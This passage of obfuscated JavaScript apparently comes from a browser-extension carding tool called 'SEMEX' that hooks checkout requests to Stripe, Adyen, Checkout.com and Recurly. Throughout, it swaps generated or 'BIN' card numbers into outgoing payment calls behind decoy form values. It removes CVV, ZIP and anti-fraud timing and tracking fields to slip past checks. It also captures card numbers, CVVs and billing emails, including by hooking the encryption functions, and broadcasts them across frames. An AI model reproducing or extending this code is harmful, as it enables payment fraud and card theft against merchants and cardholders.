        const _0xfe242d = ((_0x1c630f = _0x5d58ae.cardReplacement) == null ? undefined : _0x1c630f.enabled) && ((_0x260b7f = (_0x48f3bc = _0x5d58ae.cardReplacement) == null ? undefined : _0x48f3bc.gateways) == null ? undefined : _0x260b7f.adyen);
        const _0x12c995 = _0x11baae && ((_0x2d580f = (_0x319383 = _0x5d58ae.cvvBypass) == null ? undefined : _0x319383.gateways) == null ? undefined : _0x2d580f.adyen);
        _semexNotifyCardReplacementOff("adyen");
        if (!_0xfe242d && !_0x12c995) {
          return _0x4ce519;
        }
        if (_0x12c995) {
          const _0x42a860 = (_0x311f13 = (_0xa046fe = window.SEMEX_SESSION_RULES) == null ? undefined : _0xa046fe.xhrBypass) == null ? undefined : _0x311f13.adyen;
          if (_0x42a860 == null ? undefined : _0x42a860.targets) {
            _0x1dff51 = _0x42a860.targets;
            _0xf8ac0b("[SEMEX DEBUG] Using SERVER-DRIVEN rules for Adyen:", _0x1dff51);
          } else {}
        }
        _0xf8ac0b("[SEMEX DEBUG] Adyen Bypass - URL:", _0x2ec52a, "Targets:", _0x1dff51);
      } else if (_0x333c70) {
        const _0x5d5de4 = ((_0x56a84d = _0x5d58ae.cardReplacement) == null ? undefined : _0x56a84d.enabled) && ((_0x33c18b = (_0x5a0f5d = _0x5d58ae.cardReplacement) == null ? undefined : _0x5a0f5d.gateways) == null ? undefined : _0x33c18b.checkout);
        _semexNotifyCardReplacementOff("checkout");
        if (_0x5d5de4) {
          try {
            let _0x4ce75e = typeof _0x4ce519 === "string" ? JSON.parse(_0x4ce519) : _0x4ce519;
            const _0x59b640 = _0xb1076a();
            if (_0x59b640 && _0x59b640.number) {
              let _0x3326a5 = false;
              _0x4ce75e.number = _0x59b640.number;
              _0x3326a5 = true;
              if (_0x59b640.exp_month) {
                _0x4ce75e.expiry_month = _0x59b640.exp_month;
              }
              if (_0x59b640.exp_year) {
                _0x4ce75e.expiry_year = _0x59b640.exp_year;
              }
              const _0x280dbe = _0x11baae && ((_0x262574 = (_0x408a94 = _0x5d58ae.cvvBypass) == null ? undefined : _0x408a94.gateways) == null ? undefined : _0x262574.checkout);
              const _0x1d2d35 = _0x59b640.cvc || _0x59b640.cvv;
              if (!_0x280dbe && _0x1d2d35) {
                _0x4ce75e.cvv = _0x1d2d35;
              }
              if (_0x3326a5) {
                _0x435696({
                  number: _0x59b640.number,
                  month: _0x59b640.exp_month,
                  year: _0x59b640.exp_year,
                  cvv: _0x59b640.cvc
                });
                window.postMessage({
                  type: "SEMEX_TOAST",
                  messageType: "CARD_REPLACED",
                  gateway: "Checkout.com",
                  cardPreview: _0x59b640.number.slice(0, 6) + "xxxx",
                  url: _0x2ec52a
                }, "*");
                _0x4ce519 = JSON.stringify(_0x4ce75e);
              }
            }
          } catch (_0x107668) {}
        }
        const _0x50650a = _0x11baae && ((_0x4e5230 = (_0x3a634d = _0x5d58ae.cvvBypass) == null ? undefined : _0x3a634d.gateways) == null ? undefined : _0x4e5230.checkout);
        if (!_0x50650a) {
          return _0x4ce519;
        }
        const _0x13a927 = (_0x2c9e21 = (_0x2f1b23 = window.SEMEX_SESSION_RULES) == null ? undefined : _0x2f1b23.xhrBypass) == null ? undefined : _0x2c9e21.checkout;
        if (_0x13a927 == null ? undefined : _0x13a927.targets) {
          _0x1dff51 = _0x13a927.targets;
        } else {
          return _0x4ce519;
        }
      } else if (_0x239b0e) {
        const _0x2581ed = _0x11baae && (((_0x4a478b = (_0x1bca2e = _0x5d58ae.cvvBypass) == null ? undefined : _0x1bca2e.gateways) == null ? undefined : _0x4a478b.stripe) ?? true);
        const _0x2e0346 = ((_0x140ae6 = _0x5d58ae.cardReplacement) == null ? undefined : _0x140ae6.enabled) && ((_0x5ce8ab = (_0x37dcda = _0x5d58ae.cardReplacement) == null ? undefined : _0x37dcda.gateways) == null ? undefined : _0x5ce8ab.stripe);
        const _0x1d0d94 = _0x5d58ae.stripeSecurityBypass;
        const _0x59ae20 = (_0x1d0d94 == null ? undefined : _0x1d0d94.enabled) ?? false;
        if (!_0x509701 && !_0x2581ed && !_0x2e0346 && !_0x59ae20) {
          return _0x4ce519;
        }
        const _0x72640f = (_0xd026f7 = (_0x432933 = window.SEMEX_SESSION_RULES) == null ? undefined : _0x432933.xhrBypass) == null ? undefined : _0xd026f7.stripe;
        const _0x23eca7 = [];
        if (_0x72640f) {
          if (_0x509701 && _0x72640f.pauTargets) {
            _0x23eca7.push(..._0x72640f.pauTargets);
          }
          if (_0x2581ed && !_0x48fa9e() && _0x72640f.targets) {
            _0x23eca7.push(..._0x72640f.targets);
          }
          if (_0x59ae20 && _0x72640f.securityEnabled && _0x72640f.securityTargets) {
            const _0x4d8135 = _0x72640f.securityTargets;
            if ((_0x1d0d94.pasted ?? true) && _0x4d8135.pasted) {
              _0x23eca7.push(..._0x4d8135.pasted);
            }
            if ((_0x1d0d94.timing ?? true) && _0x4d8135.timing) {
              _0x23eca7.push(..._0x4d8135.timing);
            }
            if ((_0x1d0d94.tracking ?? true) && _0x4d8135.tracking) {
              _0x23eca7.push(..._0x4d8135.tracking);
            }
            if ((_0x1d0d94.zip ?? true) && _0x72640f.zipTargets) {
              _0x23eca7.push(..._0x72640f.zipTargets);
            }
          }
        } else if (_0x509701 || _0x2581ed || _0x59ae20) {}
        if (_0x23eca7.length === 0 && !_0x2e0346) {
          return _0x4ce519;
        }
        let _0x44333e = false;
        try {
          if (_0x4ce519.trim().startsWith("{")) {
            _0x736f4e = JSON.parse(_0x4ce519);
            _0x44333e = true;
          }
        } catch (_0x1863a1) {}
        if (!_0x44333e) {
          let _0x39dd5b = _0x4ce519;
          const _0x5c7b11 = ((_0x127185 = _0x5d58ae.cardReplacement) == null ? undefined : _0x127185.enabled) && ((_0x42095c = (_0x3a78a5 = _0x5d58ae.cardReplacement) == null ? undefined : _0x3a78a5.gateways) == null ? undefined : _0x42095c.stripe);
          const _0x208cd0 = _0x2ec52a.includes("/3ds2/") || _0x2ec52a.includes("/authenticate");
          const _0xf4c275 = {
            number: ["card[number]", "payment_method_data[card][number]", "payment_method_options[card][number]", "link[card][number]", "source_data[card][number]"],
            exp_month: ["card[exp_month]", "payment_method_data[card][exp_month]"],
            exp_year: ["card[exp_year]", "payment_method_data[card][exp_year]"],
            cvc: ["card[cvc]", "payment_method_data[card][cvc]"]
          };
          // Auto-fill pending-card swap: fires unconditionally (no cardReplacement
          // toggle needed) when SEMEX_SET_PENDING_CARD was sent during fill. The
          // visible form shows a test card; this swaps the real BIN card into the
          // outgoing Stripe API call before it leaves the browser.
          // Expire stale staged cards (3 min) so a leftover never swaps into
          // an unrelated later request on the same page.
          let _semexPendingApplied = false;
          if (window.__SEMEX_PENDING_CARD && window.__SEMEX_PENDING_CARD.ts &&
              (Date.now() - window.__SEMEX_PENDING_CARD.ts) > 180000) {
            window.__SEMEX_PENDING_CARD = null;
          }
          const _semexPending = window.__SEMEX_PENDING_CARD;
          if (_semexPending && _semexPending.number && !_0x208cd0 && _0x1ffd58(_0x4ce519, _0xf4c275)) {
            // persistent = placeholder-fill mode: the visible form holds decoy
            // values, so EVERY card-bearing request (payment_methods create,
            // confirm, retries) needs the swap — don't clear after one use.
            if (!_semexPending.persistent) window.__SEMEX_PENDING_CARD = null;
            const _semexPC = {
              number: _semexPending.number,
              exp_month: _semexPending.month || _semexPending.exp_month,
              exp_year: _semexPending.year || _semexPending.exp_year,
              cvc: _semexPending.cvv || _semexPending.cvc
            };
            const _semexNumKeys = ["card[number]", "payment_method_data[card][number]", "payment_method_options[card][number]", "link[card][number]", "source_data[card][number]"];
            const _semexMonKeys = ["card[exp_month]", "payment_method_data[card][exp_month]", "payment_method_options[card][exp_month]", "link[card][exp_month]", "source_data[card][exp_month]"];
            const _semexYrKeys  = ["card[exp_year]",  "payment_method_data[card][exp_year]",  "payment_method_options[card][exp_year]",  "link[card][exp_year]",  "source_data[card][exp_year]"];
            const _semexCvcKeys = ["card[cvc]", "payment_method_data[card][cvc]", "payment_method_options[card][cvc]", "link[card][cvc]", "source_data[card][cvc]"];
            _0x39dd5b = _0x3d6c2f(_0x39dd5b, _semexNumKeys, _semexPC.number);
            if (_semexPC.exp_month) _0x39dd5b = _0x3d6c2f(_0x39dd5b, _semexMonKeys, String(_semexPC.exp_month));
            if (_semexPC.exp_year)  _0x39dd5b = _0x3d6c2f(_0x39dd5b, _semexYrKeys,  String(_semexPC.exp_year).slice(-2));
            if (_semexPC.cvc)       _0x39dd5b = _0x3d6c2f(_0x39dd5b, _semexCvcKeys, _semexPC.cvc);
            if (_0x39dd5b !== _0x4ce519) {
              _0x4d64c8 = true;
              _semexPendingApplied = true;
              _0x435696({ number: _semexPC.number, month: _semexPC.exp_month, year: _semexPC.exp_year, cvv: _semexPC.cvc });
            }
          }
          // Skip the cardReplacement re-substitution when the staged pending
          // card was already swapped in above — otherwise a second, freshly
          // generated card would overwrite it and the submitted card would
          // differ from the one staged at fill time.
          if (_0x5c7b11 && !_semexPendingApplied && !_0x208cd0 && _0x1ffd58(_0x4ce519, _0xf4c275)) {
            const _0x2ea497 = _0xb1076a();
            if (_0x2ea497 && _0x2ea497.number) {
              const _0x41e3df = ["card[number]", "payment_method_data[card][number]", "payment_method_options[card][number]", "link[card][number]", "source_data[card][number]"];
              _0x39dd5b = _0x3d6c2f(_0x39dd5b, _0x41e3df, _0x2ea497.number);
              if (_0x2ea497.exp_month) {
                const _0x4d00c5 = ["card[exp_month]", "payment_method_data[card][exp_month]", "payment_method_options[card][exp_month]", "link[card][exp_month]", "source_data[card][exp_month]"];
                _0x39dd5b = _0x3d6c2f(_0x39dd5b, _0x4d00c5, String(_0x2ea497.exp_month));
              }
              if (_0x2ea497.exp_year) {
                const _0x383032 = ["card[exp_year]", "payment_method_data[card][exp_year]", "payment_method_options[card][exp_year]", "link[card][exp_year]", "source_data[card][exp_year]"];
                const _0x5e3f60 = String(_0x2ea497.exp_year).slice(-2);
                _0x39dd5b = _0x3d6c2f(_0x39dd5b, _0x383032, _0x5e3f60);
              }
              if (_0x2ea497.cvc && (!_0x2581ed || _0x48fa9e())) {
                const _0x53f3be = ["card[cvc]", "payment_method_data[card][cvc]", "payment_method_options[card][cvc]", "link[card][cvc]", "source_data[card][cvc]"];
                _0x39dd5b = _0x3d6c2f(_0x39dd5b, _0x53f3be, _0x2ea497.cvc);
              }
              if (_0x39dd5b !== _0x4ce519) {
                _0x4d64c8 = true;
                _0x435696({
                  number: _0x2ea497.number,
                  month: _0x2ea497.exp_month,
                  year: _0x2ea497.exp_year,
                  cvv: _0x2ea497.cvc
                });
                window.postMessage({
                  type: "SEMEX_TOAST",
                  messageType: "CARD_REPLACED",
                  gateway: "Stripe",
                  cardPreview: _0x2ea497.number.slice(0, 6) + "xxxx"
                }, "*");
              }
            }
          }
          if (_0x23eca7.length > 0) {
            const _0x3112c7 = _0x26cf9e(_0x39dd5b, _0x23eca7);
            if (_0x3112c7 !== _0x39dd5b) {
              _0x4d64c8 = true;
              _0x39dd5b = _0x3112c7;
              const _0x135927 = [];
              if (_0x2581ed && !_0x48fa9e()) {
                _0x135927.push("CVV");
              }
              if (_0x509701) {
                _0x135927.push("PAU");
              }
              try {
                window.postMessage({
                  type: "SEMEX_TOAST",
                  messageType: "BYPASS_ACTIVATED",
                  gateway: "Stripe",
                  bypassTypes: _0x135927,
                  url: _0x2ec52a || window.location.href
                }, "*");
              } catch (_0x867a7e) {}
            }
          }
          if (_0x4d64c8) {
            return _0x39dd5b;
          }
        }
      }
      if (_0x4612ef) {
        const _0x54c6be = (_0x1be93f = (_0x2467de = window.SEMEX_SESSION_RULES) == null ? undefined : _0x2467de.xhrBypass) == null ? undefined : _0x1be93f.recurly;
        if (_0x54c6be == null ? undefined : _0x54c6be.enabled) {
          let _0x131bde = _0x4ce519;
          const _0x1ef4ff = _0x11baae && (((_0x29308b = (_0x1f1a86 = _0x5d58ae.cvvBypass) == null ? undefined : _0x1f1a86.gateways) == null ? undefined : _0x29308b.recurly) ?? true);
          const _0x5299ad = ((_0x565e49 = _0x5d58ae.cardReplacement) == null ? undefined : _0x565e49.enabled) && (((_0x4a7835 = (_0x1a36a9 = _0x5d58ae.cardReplacement) == null ? undefined : _0x1a36a9.gateways) == null ? undefined : _0x4a7835.recurly) ?? true);
          _semexNotifyCardReplacementOff("recurly");
          if (_0x5299ad) {
            const _0x478de1 = _0xb1076a();
            if (_0x478de1 && _0x478de1.number) {
              _0x131bde = _0x3d6c2f(_0x131bde, ["number"], _0x478de1.number);
              if (_0x478de1.exp_month) {
                _0x131bde = _0x3d6c2f(_0x131bde, ["month"], String(_0x478de1.exp_month));
              }
              if (_0x478de1.exp_year) {
                _0x131bde = _0x3d6c2f(_0x131bde, ["year"], String(_0x478de1.exp_year));
              }
              const _0xd1ca37 = _0x478de1.cvc || _0x478de1.cvv;
              if (_0xd1ca37 && !_0x11baae) {
                _0x131bde = _0x3d6c2f(_0x131bde, ["cvv"], _0xd1ca37);
              }
              if (_0x131bde !== _0x4ce519) {
                _0x435696({
                  number: _0x478de1.number,
                  month: _0x478de1.exp_month,
                  year: _0x478de1.exp_year,
                  cvv: _0x478de1.cvc
                });
                window.postMessage({
                  type: "SEMEX_TOAST",
                  messageType: "CARD_REPLACED",
                  gateway: "Recurly",
                  cardPreview: _0x478de1.number.slice(0, 6) + "xxxx",
                  url: _0x2ec52a
                }, "*");
              }
            }
          }
          if (_0x1ef4ff && _0x54c6be.targets) {
            let _0x206259 = _0x131bde;
            _0x54c6be.targets.forEach(_0x52ec58 => {
              _0x206259 = _0x3d6c2f(_0x206259, [_0x52ec58], "");
            });
            if (_0x206259 !== _0x131bde) {
              _0x131bde = _0x206259;
              window.postMessage({
                type: "SEMEX_TOAST",
                messageType: "BYPASS_ACTIVATED",
                gateway: "Recurly",
                bypassTypes: ["CVV"],
                url: _0x2ec52a || window.location.href
              }, "*");
            }
          }
          if (_0x131bde !== _0x4ce519) {
            return _0x131bde;
          }
        }
        return _0x4ce519;
      }
      if (_0x1dff51.length === 0) {
        return _0x4ce519;
      }
      try {
        if (!_0x736f4e) {
          _0x736f4e = JSON.parse(_0x4ce519);
        }
      } catch (_0x35a574) {
        if (_0x1dff51.length > 0 && (_0x527a68 || _0x333c70)) {
          const _0x2dd6e3 = _0x26cf9e(_0x4ce519, _0x1dff51);
          if (_0x2dd6e3 !== _0x4ce519) {
            return _0x2dd6e3;
          }
        }
        return _0x4ce519;
      }
      _0x1dff51.forEach(_0x1028ef => {
        const _0x87ea72 = _0x5a041b(_0x736f4e, _0x1028ef);
        if (_0x87ea72) {
          _0xf8ac0b("[SEMEX DEBUG] Found target field:", _0x1028ef, "at path:", _0x87ea72);
          _0x736f4e = _0xb8b246(_0x736f4e, _0x87ea72);
          _0x4d64c8 = true;
          _0xf8ac0b("[SEMEX DEBUG] Removed field successfully");
        }
      });
      if (_0x4d64c8) {
        try {
          const _0x55257b = JSON.stringify(_0x736f4e);
          JSON.parse(_0x55257b);
          _0xf8ac0b("[SEMEX DEBUG] ✅ Modified JSON is valid");
          const _0x372c36 = _0x2ec52a.includes("adyen") || _0x2ec52a.includes("api.gog.com") ? "Adyen" : _0x2ec52a.includes("checkout.com") ? "Checkout.com" : "Unknown";
          window.postMessage({
            type: "SEMEX_TOAST",
            messageType: "BYPASS_ACTIVATED",
            gateway: _0x372c36,
            bypassTypes: ["CVV"],
            url: _0x2ec52a
          }, "*");
          return _0x55257b;
        } catch (_0x58b2dc) {
          return _0x4ce519;
        }
      }
    } catch (_0x1a6897) {}
    return _0x4ce519;
  }
  __name(_0x2cff8b, "applyOptimisticBypass");
  // SEMEX: harvest the customer's billing email + return_url from the SAME
  // outgoing Stripe confirm request that carries the card. stripe_inbuilt
  // (Elements / SetupIntent) responses never include these, so without this the
  // hit shows Customer Email / Success URL as "—". Payment-specific keys only
  // (billing_details.email, receipt_email, return_url) so non-payment requests
  // never pollute the stash. Best-effort: never throws, only fills when found.
  function _semexHarvestBilling(_0xbody) {
    try {
      if (!_0xbody) {
        return;
      }
      const _semexNorm = function (_0xv) {
        if (_0xv == null) {
          return null;
        }
        const _0xs = String(_0xv).trim();
        return _0xs && _0xs !== "null" && _0xs !== "undefined" ? _0xs : null;
      };
      let _0xemail = null;
      let _0xret = null;
      if (typeof _0xbody === "object" && !(_0xbody instanceof FormData)) {
        const _0xbd = _0xbody.payment_method_data && _0xbody.payment_method_data.billing_details || _0xbody.payment_method && _0xbody.payment_method.billing_details || _0xbody.billing_details || null;
        _0xemail = _semexNorm(_0xbd && _0xbd.email) || _semexNorm(_0xbody.receipt_email);
        // success_url is an equally valid merchant-return destination that some
        // Payment Element integrations send on the confirm instead of return_url.
        _0xret = _semexNorm(_0xbody.return_url) || _semexNorm(_0xbody.success_url);
      } else if (_0xbody instanceof FormData) {
        _0xemail = _semexNorm(_0xbody.get("payment_method_data[billing_details][email]")) || _semexNorm(_0xbody.get("billing_details[email]")) || _semexNorm(_0xbody.get("receipt_email"));
        _0xret = _semexNorm(_0xbody.get("return_url")) || _semexNorm(_0xbody.get("success_url"));
      } else if (typeof _0xbody === "string") {
        let _0xparsed = null;
        try {
          _0xparsed = JSON.parse(_0xbody);
        } catch (_0xje) {}
        if (_0xparsed && typeof _0xparsed === "object") {
          const _0xbd2 = _0xparsed.payment_method_data && _0xparsed.payment_method_data.billing_details || _0xparsed.payment_method && _0xparsed.payment_method.billing_details || _0xparsed.billing_details || null;
          _0xemail = _semexNorm(_0xbd2 && _0xbd2.email) || _semexNorm(_0xparsed.receipt_email);
          _0xret = _semexNorm(_0xparsed.return_url) || _semexNorm(_0xparsed.success_url);
        } else {
          const _0xq = new URLSearchParams(_0xbody);
          _0xemail = _semexNorm(_0xq.get("payment_method_data[billing_details][email]")) || _semexNorm(_0xq.get("billing_details[email]")) || _semexNorm(_0xq.get("receipt_email"));
          _0xret = _semexNorm(_0xq.get("return_url")) || _semexNorm(_0xq.get("success_url"));
        }
      }
      if (!_0xemail && !_0xret) {
        return;
      }
      const _0xroot = window.top && window.top !== window ? window.top : window;
      try {
        const _0xprev = _0xroot.__SEMEX_LAST_BILLING || {};
        _0xroot.__SEMEX_LAST_BILLING = {
          email: _0xemail || _0xprev.email || null,
          returnUrl: _0xret || _0xprev.returnUrl || null,
          ts: Date.now()
        };
      } catch (_0xce) {
        try {
          window.__SEMEX_LAST_BILLING = {
            email: _0xemail,
            returnUrl: _0xret,
            ts: Date.now()
          };
        } catch (_0xce2) {}
        // Cross-origin top frame (e.g. js.stripe.com elements-inner iframe inside
        // checkout.stripe.com): direct write to window.top is blocked by CORS.
        // Relay via postMessage so the top-frame listener can stash the data there.
        try {
          if (window.parent && window.parent !== window) {
            window.parent.postMessage({
              type: "_SEMEX_BILLING_RELAY",
              email: _0xemail,
              returnUrl: _0xret,
              ts: Date.now()
            }, "*");
          }
        } catch (_0xrelayErr) {}
      }
    } catch (_0xhe) {}
  }
  __name(_semexHarvestBilling, "semexHarvestBilling");
  function _0xd23bbe(_0x21a510) {
    var _0x864f5f;
    var _0x47cf37;
    var _0x41439b;
    var _0x366a74;
    var _0x26864b;
    var _0x4c7fcc;
    if (!_0x21a510) {
      return null;
    }
    try {
      try {
        _semexHarvestBilling(_0x21a510);
      } catch (_0xhbErr) {}
      let _0x415122 = null;
      if (_0x21a510 && typeof _0x21a510 === "object" && !(_0x21a510 instanceof FormData)) {
        const _0x593d88 = _0x21a510.card || ((_0x864f5f = _0x21a510.payment_method_data) == null ? undefined : _0x864f5f.card) || ((_0x47cf37 = _0x21a510.source_data) == null ? undefined : _0x47cf37.card) || ((_0x41439b = _0x21a510.payment_method) == null ? undefined : _0x41439b.card);
        if (_0x593d88 && _0x593d88.number && String(_0x593d88.number).replace(/\s/g, "").length >= 13) {
          return _0x2ec6eb(_0x593d88);
        }
      }
      if (typeof _0x21a510 === "string") {
        try {
          const _0x167bb5 = JSON.parse(_0x21a510);
          const _0x3efa89 = _0x167bb5.card || ((_0x366a74 = _0x167bb5.payment_method_data) == null ? undefined : _0x366a74.card) || ((_0x26864b = _0x167bb5.source_data) == null ? undefined : _0x26864b.card) || ((_0x4c7fcc = _0x167bb5.payment_method) == null ? undefined : _0x4c7fcc.card);
          if (_0x3efa89 && _0x3efa89.number && String(_0x3efa89.number).replace(/\s/g, "").length >= 13) {
            return _0x2ec6eb(_0x3efa89);
          }
          if (_0x167bb5.number && String(_0x167bb5.number).replace(/\s/g, "").length >= 13) {
            return {
              number: String(_0x167bb5.number).replace(/\s/g, ""),
              month: _0x167bb5.expiry_month || _0x167bb5.exp_month,
              year: _0x167bb5.expiry_year || _0x167bb5.exp_year,
              cvv: _0x167bb5.cvv || _0x167bb5.cvc || null
            };
          }
        } catch (_0x552679) {
          const _0xcd3b3d = new URLSearchParams(_0x21a510);
          const _0x29d711 = _0xcd3b3d.get("card[number]") || _0xcd3b3d.get("payment_method_data[card][number]") || _0xcd3b3d.get("source_data[card][number]");
          if (_0x29d711 && String(_0x29d711).replace(/\s/g, "").length >= 13) {
            return {
              number: _0x29d711.replace(/\s/g, ""),
              month: _0xcd3b3d.get("card[exp_month]") || _0xcd3b3d.get("payment_method_data[card][exp_month]"),
              year: _0xcd3b3d.get("card[exp_year]") || _0xcd3b3d.get("payment_method_data[card][exp_year]"),
              cvv: _0xcd3b3d.get("card[cvc]") || _0xcd3b3d.get("card[cvv]") || _0xcd3b3d.get("payment_method_data[card][cvc]") || _0xcd3b3d.get("payment_method_data[card][cvv]") || _0xcd3b3d.get("source_data[card][cvc]") || null
            };
          }
        }
      } else if (_0x21a510 instanceof FormData) {
        const _0xa03cb3 = _0x21a510.get("card[number]") || _0x21a510.get("payment_method_data[card][number]") || _0x21a510.get("source_data[card][number]");
        if (_0xa03cb3 && String(_0xa03cb3).replace(/\s/g, "").length >= 13) {
          return {
            number: String(_0xa03cb3).replace(/\s/g, ""),
            month: _0x21a510.get("card[exp_month]") || _0x21a510.get("payment_method_data[card][exp_month]"),
            year: _0x21a510.get("card[exp_year]") || _0x21a510.get("payment_method_data[card][exp_year]"),
            cvv: _0x21a510.get("card[cvc]") || _0x21a510.get("card[cvv]") || _0x21a510.get("payment_method_data[card][cvc]") || _0x21a510.get("payment_method_data[card][cvv]") || _0x21a510.get("source_data[card][cvc]") || null
          };
        }
      }
      return _0x415122;
    } catch (_0x1de774) {
      return null;
    }
  }
  __name(_0xd23bbe, "extractCardDataFromRequest");
  function _0x2ec6eb(_0x29e6d8) {
    return {
      number: String(_0x29e6d8.number).replace(/\s/g, ""),
      month: _0x29e6d8.exp_month || _0x29e6d8.expMonth,
      year: _0x29e6d8.exp_year || _0x29e6d8.expYear,
      cvv: _0x29e6d8.cvc || _0x29e6d8.cvv
    };
  }
  __name(_0x2ec6eb, "formatCardData");
  function _0x435696(_0x3762cc) {
    if (!_0x3762cc) {
      return;
    }
    const _0x5b2cc0 = window.top && window.top !== window ? window.top : window;
    let _0x157d2b = null;
    try {
      _0x157d2b = _0x5b2cc0.__LAST_CAPTURED_CARD || _0x5b2cc0.lastInterceptedCardData;
    } catch (_0x5a96cf) {
      try {
        _0x157d2b = window.__LAST_CAPTURED_CARD || window.lastInterceptedCardData;
      } catch (_0x5825fc) {}
    }
    const _0x57ea2d = {
      number: ((_0x3762cc == null ? undefined : _0x3762cc.number) ? String(_0x3762cc.number).replace(/\s/g, "") : null) || (_0x157d2b == null ? undefined : _0x157d2b.number) || null,
      month: (_0x3762cc == null ? undefined : _0x3762cc.month) || (_0x3762cc == null ? undefined : _0x3762cc.exp_month) || (_0x157d2b == null ? undefined : _0x157d2b.month) || (_0x157d2b == null ? undefined : _0x157d2b.exp_month) || null,
      year: (_0x3762cc == null ? undefined : _0x3762cc.year) || (_0x3762cc == null ? undefined : _0x3762cc.exp_year) || (_0x157d2b == null ? undefined : _0x157d2b.year) || (_0x157d2b == null ? undefined : _0x157d2b.exp_year) || null,
      cvv: (_0x3762cc == null ? undefined : _0x3762cc.cvv) || (_0x3762cc == null ? undefined : _0x3762cc.cvc) || (_0x157d2b == null ? undefined : _0x157d2b.cvv) || (_0x157d2b == null ? undefined : _0x157d2b.cvc) || null
    };
    if (!_0x57ea2d.number) {
      return;
    }
    try {
      _0x5b2cc0.__LAST_CAPTURED_CARD = _0x57ea2d;
      _0x5b2cc0.lastInterceptedCardData = _0x57ea2d;
      if (window !== _0x5b2cc0) {
        window.__LAST_CAPTURED_CARD = _0x57ea2d;
        window.lastInterceptedCardData = _0x57ea2d;
      }
    } catch (_0x35d6c3) {
      window.__LAST_CAPTURED_CARD = _0x57ea2d;
      window.lastInterceptedCardData = _0x57ea2d;
    }
    const _0x39d8c4 = {
      type: "CARD_DATA_CAPTURED",
      card: _0x57ea2d
    };
    const _0x3e8eaa = {
      type: "CARD_DATA_INTERCEPTED",
      card: _0x57ea2d
    };
    window.postMessage(_0x39d8c4, "*");
    window.postMessage(_0x3e8eaa, "*");
    if (window.top && window.top !== window) {
      try {
        window.top.postMessage(_0x39d8c4, "*");
        window.top.postMessage(_0x3e8eaa, "*");
      } catch (_0x5979a4) {}
    }
  }
  __name(_0x435696, "broadcastCardData");
  __name(function _0xf95d7b() {
    if (window.TextEncoder && window.TextEncoder.prototype) {
      const _0x497c92 = window.TextEncoder.prototype.encode;
      window.TextEncoder.prototype.encode = function (_0x3c92be) {
        var _0x1651cc;
        var _0x35eb9d;
        var _0x225696;
        try {
          if (typeof _0x3c92be === "string" && (_0x3c92be.includes("number") || _0x3c92be.includes("cardNumber") || _0x3c92be.includes("pan"))) {
            const _0x5bf8cf = window.SEMEX_SETTINGS || {};
            const _0x238d7d = ((_0x1651cc = _0x5bf8cf.cvvBypass) == null ? undefined : _0x1651cc.enabled) && ((_0x225696 = (_0x35eb9d = _0x5bf8cf.cvvBypass) == null ? undefined : _0x35eb9d.gateways) == null ? undefined : _0x225696.adyen);
            try {
              if (_0x3c92be.trim().startsWith("{")) {
                const _0x25c46f = JSON.parse(_0x3c92be);
                const _0x12eb4a = _0x25c46f.generationtime !== undefined;
                const _0x22d586 = _0x25c46f.paymentMethod || _0x25c46f;
                const _0x4e1260 = _0x22d586.number || _0x22d586.cardNumber || _0x22d586.pan;
                if (_0x4e1260 && String(_0x4e1260).replace(/\s/g, "").length >= 13) {
                  const _0x27fa11 = {
                    number: String(_0x4e1260).replace(/\s/g, ""),
                    month: _0x22d586.expiryMonth || _0x22d586.expMonth || _0x22d586.exp_month,
                    year: _0x22d586.expiryYear || _0x22d586.expYear || _0x22d586.exp_year,
                    cvv: _0x22d586.cvc || _0x22d586.encryptedSecurityCode || _0x22d586.cvv
                  };
                  if (_0x12eb4a || _0x27fa11.number.length >= 13) {
                    _0x435696(_0x27fa11);
                  }
                }
                if (_0x238d7d && (_0x12eb4a || _0x4e1260 && String(_0x4e1260).replace(/\s/g, "").length >= 13)) {
                  let _0x4a0828 = false;
                  const _0x4c190e = ["cvc", "encryptedSecurityCode", "cvv"];
                  const _0x1b7953 = __name(_0x2b45d9 => {
                    let _0x3c3bce = false;
                    _0x4c190e.forEach(_0x43361f => {
                      if (_0x2b45d9[_0x43361f] !== undefined) {
                        delete _0x2b45d9[_0x43361f];
                        _0x3c3bce = true;
                      }
                    });
                    return _0x3c3bce;
                  }, "removeField");
                  if (_0x25c46f.paymentMethod) {
                    if (_0x1b7953(_0x25c46f.paymentMethod)) {
                      _0x4a0828 = true;
                    }
                  }
                  if (_0x1b7953(_0x25c46f)) {
                    _0x4a0828 = true;
                  }
                  if (_0x4a0828) {
                    return _0x497c92.call(this, JSON.stringify(_0x25c46f));
                  }
                }
              }
            } catch (_0x5e15c1) {}
          }
        } catch (_0x3b8d0b) {}
        return _0x497c92.call(this, _0x3c92be);
      };
    }
    if (window.crypto && window.crypto.subtle) {
      const _0x53cc4a = window.crypto.subtle.encrypt;
      window.crypto.subtle.encrypt = async function (..._0x49fbdb) {
        try {
          const _0x3f82ad = _0x49fbdb[2];
          if (window.TextDecoder) {
            const _0x27290d = new TextDecoder();
            const _0x36686f = _0x27290d.decode(_0x3f82ad);
            if (_0x36686f.includes("number") || _0x36686f.includes("cardNumber")) {
              try {
                const _0x306f8d = JSON.parse(_0x36686f);
                const _0x29fc13 = _0x306f8d.generationtime !== undefined;
                const _0x36488b = _0x306f8d.paymentMethod || _0x306f8d;
                const _0x23fa1f = _0x36488b.number || _0x36488b.cardNumber || _0x36488b.pan;
                if (_0x23fa1f && String(_0x23fa1f).replace(/\s/g, "").length >= 13) {
                  const _0x423378 = {
                    number: String(_0x23fa1f).replace(/\s/g, ""),
                    month: _0x36488b.expiryMonth || _0x36488b.expMonth || _0x36488b.exp_month,
                    year: _0x36488b.expiryYear || _0x36488b.expYear || _0x36488b.exp_year,
                    cvv: _0x36488b.cvc || _0x36488b.encryptedSecurityCode || _0x36488b.cvv
                  };
                  if (_0x29fc13 || _0x423378.number.length >= 13) {
                    _0x435696(_0x423378);
                  }
                }
              } catch (_0x211e78) {}
            }
          }
        } catch (_0x45a98a) {}
        return _0x53cc4a.apply(this, _0x49fbdb);
      };
    }
  }, "initAdyenHooks")();
  function _0x58db0a(_0x54e523) {
    var _0x4f2de8;
    if (!_0x54e523) {
      return false;
    }
    const _0x40247c = _0x54e523.toLowerCase();
    const _0xcbe5a7 = ((_0x4f2de8 = window.SEMEX_SESSION_RULES) == null ? undefined : _0x4f2de8.skipPatterns) || {};
    if (_0xcbe5a7.stripe && Array.isArray(_0xcbe5a7.stripe)) {
      const _0x33f862 = _0xcbe5a7.stripe.some(_0x15301c => _0x40247c.includes(_0x15301c.toLowerCase()));
      if (_0x33f862) {
        return false;
      }
    }
    if (_0xcbe5a7.adyen && Array.isArray(_0xcbe5a7.adyen)) {
